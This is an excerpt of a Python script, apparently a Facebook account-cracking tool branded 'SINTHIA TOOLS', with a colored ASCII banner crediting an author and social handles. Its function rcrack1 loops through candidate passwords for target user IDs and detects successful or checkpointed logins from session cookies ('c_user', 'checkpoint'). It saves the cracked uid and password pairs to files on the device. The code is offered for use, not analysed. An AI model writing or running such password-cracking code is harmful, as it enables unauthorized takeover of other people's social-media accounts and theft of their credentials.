...
logo= """  
 \033[1;92m
  ______   ______  __    __  ________  __    __  ______   ______  
 /      \ |      \|  \  |  \|        \|  \  |  \|      \ /      \ 
|  $$$$$$\ \$$$$$$| $$\ | $$ \$$$$$$$$| $$  | $$ \$$$$$$|  $$$$$$\
| $$___\$$  | $$  | $$$\| $$   | $$   | $$__| $$  | $$  | $$__| $$
 \$$    \   | $$  | $$$$\ $$   | $$   | $$    $$  | $$  | $$    $$
...
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SINTHIA TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m SINTHIA
\033[1;32m[-] VERSION   :\033[1;32m 1.0
\033[1;32m[-] AUTHOR    :\033[1;32m SADMAN SINTHIA SNIGDHO 
\033[1;32m[-] GITHUB    :\033[1;32m MORAD-KHAN-BS
\033[1;32m[-] FACEBOOK  :\033[1;32m KING MORAD
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS MORAD BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
linex=('\033[1;31m══════════════════════════════════════════')   
try:
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sSINTHIA\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[SINTHIA-OK💚] {uid}|{ps}")
                open('/sdcard/SINTHIA-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               # print(f"\x1b[38;5;196m[SINTHIA-CP💔] {uid}|{ps}")
                open('/sdcard/SINTHIA-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
